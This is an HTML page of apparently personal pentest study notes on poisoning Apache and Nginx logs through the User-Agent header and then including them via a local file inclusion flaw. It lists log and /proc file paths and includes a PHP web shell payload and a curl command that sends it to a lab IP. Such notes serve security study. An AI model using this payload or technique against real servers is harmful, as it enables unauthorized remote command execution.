<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Web Server Log Poisoning</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Web Server Log Poisoning</h1><br/><br /><strong><h3>Server Log Poisoning</h3></strong><br /><br />1. Poison Web Server Log through an input that we can control<br />	Apache and Nginx maintain log files:<br />   ◇ access.log → contains various information about all requests made to the server, including headers<br />      ▪ <strong><span style="color:#2ddff7;">User-Agent</span></strong> header → is usually an header that <span style="text-decoration:underline;">we can control</span> and with we can poison the server<br />   ◇ error.log<br />	<a href=""><img src="images/2374-1.png" alt="images/2374-1.png" /></a><br />	<span style="text-decoration:underline;">Note:</span>  all requests to the server get logged, we can poison any request to the web application<br /><br />2. include the logs through LFI vulnerability <br />	<span style="text-decoration:underline;">Note</span>: Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don&#39;t send unnecessary requests.<br />   ◇ <span style="text-decoration:underline;">Nginx logs</span> are readable by low privileged users by default (e.g. www-data)<br />      ▪ Linux: /var/log/nginx/<br />      ▪ Windows: C:\nginx\log\<br />   ◇ <span style="text-decoration:underline;">Apache logs</span> are only readable by users with high privileges (e.g. root/adm groups)<br />      In older or misconfigured Apache servers, these logs may be readable by low-privileged users.<br />      ▪ Linux:  /var/log/apache2/<br />      ▪ Windows: C:\xampp\apache\logs\<br />   ◇ <span style="text-decoration:underline;">/proc/ directory logs</span>  <span style="color:#2ddff7;">User-Agent</span> header is also shown on process files under the Linux /proc/ directory (<em>these files may </em><em><span style="background-color:#f66151;">only be readable by privileged users</span></em>)<br />      ▪ /proc/self/environ<br />      ▪ /proc/self/fd/N →  where N is a PID usually between 0-50<br /><br />	<a href=""><img src="images/2374-2.png" alt="images/2374-2.png" /></a><br />------------<br /><br />3. Poison of the logs with a Web Shell (similar to point 1)<br />	<div class="codebox"><pre>User-Agent<span style="color:#ff9d00;font-weight:700">:</span> &lt;?php system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_GET</span>[<span style="color:#3ad900;font-weight:400">&#39;cmd&#39;</span>]<span style="color:#ff9d00;font-weight:700">);</span> ?&gt;</pre></div><br />	<div class="codebox"><pre>curl -s <span style="color:#3ad900;font-weight:400">&quot;http://134.209.186.36:31721/index.php&quot;</span> -A <span style="color:#3ad900;font-weight:400">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span></pre></div><br />	<a href=""><img src="images/2374-3.png" alt="images/2374-3.png" /></a><br /><br />4. Access to the logs, <strong><span style="color:#2ddff7;">the webshell ( &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;) is not viewed because got executed</span></strong><br />	<a href=""><img src="images/2374-4.png" alt="images/2374-4.png" /></a><br /><br />	execution of commands<br />	<a href=""><img src="images/2374-5.png" alt="images/2374-5.png" /></a><br /><br /></div>
</body>
</html>
